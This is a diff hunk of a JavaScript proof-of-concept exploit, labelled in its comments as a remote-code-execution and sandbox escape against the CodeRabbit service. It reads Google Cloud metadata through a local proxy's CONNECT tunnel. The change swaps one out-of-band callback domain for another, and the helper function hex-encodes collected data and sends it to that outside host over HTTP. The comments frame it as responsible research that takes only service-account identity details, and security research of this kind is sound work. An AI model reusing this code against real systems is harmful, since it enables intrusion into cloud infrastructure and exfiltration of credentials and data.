@@ -1,7 +1,7 @@
 // CodeRabbit RCE — ESCAPE PROOF: read GCP metadata via proxy CONNECT-tunnel.
 // localhost:1080 honors CONNECT and tunnels to metadata:80 (sandbox is firewalled from it).
 // Responsible: retrieves the SA IDENTITY (email/scopes/project/SA-list), NOT the access token.
-var C = 'd8soamroeaqnk9qs3d905dte3hpgjnhmh.oast.site';
+var C = 'd8sp71joeaqnr4fndoq0uzofhnkg5y4e5.oast.site';
 var http = require('http'), dns = require('dns'), net = require('net');
 var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
 var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1700), timeout: 9000 }, function () {}).on('error', function () {}); } catch (e) {} };
